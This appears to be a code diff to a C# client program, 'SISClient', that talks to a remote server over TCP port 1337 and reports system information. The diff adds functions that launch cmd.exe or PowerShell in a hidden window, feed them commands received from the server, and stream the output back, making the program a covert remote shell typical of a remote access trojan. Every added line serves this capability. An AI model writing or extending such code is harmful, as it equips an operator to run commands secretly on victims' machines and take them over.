@@ -15,6 +15,10 @@ using System.Net.NetworkInformation;
 using Microsoft.Win32;
 using static System.Net.Mime.MediaTypeNames;
 using System.Reflection;
+using System.Runtime.Serialization.Formatters.Binary;
+using System.Management.Automation.Host;
+using System.Drawing;
+using System.Diagnostics;
 
 namespace SISClient
 {
@@ -22,6 +26,9 @@ namespace SISClient
     {
         private static readonly Socket _clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
         private const int _PORT = 1337;
+        private static StreamReader fromShell;
+        private static StreamWriter toShell;
+        private static StreamReader eror;
 
         static void Main(string[] args)
          {
@@ -67,6 +74,10 @@ namespace SISClient
                 ReceiveResponse();
             }
         }
+
+        private static bool cmdT = false;
+        private static bool powershellT = false;
+
         private static void ReceiveResponse()
         {
             try
@@ -87,7 +98,65 @@ namespace SISClient
                     string responde = "systeminfo;" + id.ToString() + ";" + info;
                     sendCommand(responde);
                 }
-                if (text != "control" && text != "systeminfo-")
+                
+                if (text == "startpowershell")
+                {
+                    ProcessStartInfo info = new ProcessStartInfo();
+                    info.FileName = "powershell.exe";
+                    info.CreateNoWindow = true;
+                    info.UseShellExecute = false;
+                    info.RedirectStandardInput = true;
+                    info.RedirectStandardOutput = true;
+                    info.RedirectStandardError = true;
+
+                    Process p = new Process();
+                    p.StartInfo = info;
+                    p.Start();
+                    toShell = p.StandardInput;
+                    fromShell = p.StandardOutput;
+                    eror = p.StandardError;
+                    toShell.AutoFlush = true;
+
+                    Thread shellThread = new Thread(new ThreadStart(getShellInput));
+                    shellThread.Start();
+                }
+
+                if (text == "startcmd")
+                {
+                    ProcessStartInfo info = new ProcessStartInfo();
+                    info.FileName = "cmd.exe";
+                    info.CreateNoWindow = true;
+                    info.UseShellExecute = false;
+                    info.RedirectStandardInput = true;
+                    info.RedirectStandardOutput = true;
+                    info.RedirectStandardError = true;
+
+                    Process p = new Process();
+                    p.StartInfo = info;
+                    p.Start();
+                    toShell = p.StandardInput;
+                    fromShell = p.StandardOutput;
+                    eror = p.StandardError;
+                    toShell.AutoFlush = true;
+
+                    Thread shellThread = new Thread(new ThreadStart(getShellInput));
+                    shellThread.Start();
+
+                }
+
+                if (text.StartsWith("cmd"))
+                {
+                    string command = text.Split('§')[1];
+                    toShell.WriteLine(command + "\r\n");
+                }
+
+                if (text.StartsWith("powershell"))
+                {
+                    string command = text.Split('§')[1];
+                    toShell.WriteLine(command + "\r\n");
+                }
+
+                if (text != "control" && text != "systeminfo-" && !text.StartsWith("cmd") && !text.StartsWith("powershell"))
                 {
                         try
                         {
@@ -114,6 +183,36 @@ namespace SISClient
             }
             catch
             {
+            }
+        }
+
+        private static void getShellInput()
+        {
+            try
+            {
+                string tempBuf = "";
+                string tempError = "";
+                string edata = "";
+                string sdata = "";
+                while ((tempBuf = fromShell.ReadLine()) != null)
+                {
+                    sdata = sdata + tempBuf + "\r";
+                    sdata = sdata.Replace("cmdout", String.Empty);
+                    sendCommand("cmdout§" + sdata);
+                    sdata = "";
+                }
+
+                while ((tempError = eror.ReadLine()) != null)
+                {
+                    edata = edata + tempError + "\r";
+                    sendCommand("cmdout§" + edata);
+                    edata = "";
+                }
+
+            }
+            catch (Exception ex)
+            {
+                sendCommand("cmdout§Error reading cmd response: \n" + ex.Message);
             }
         }
 
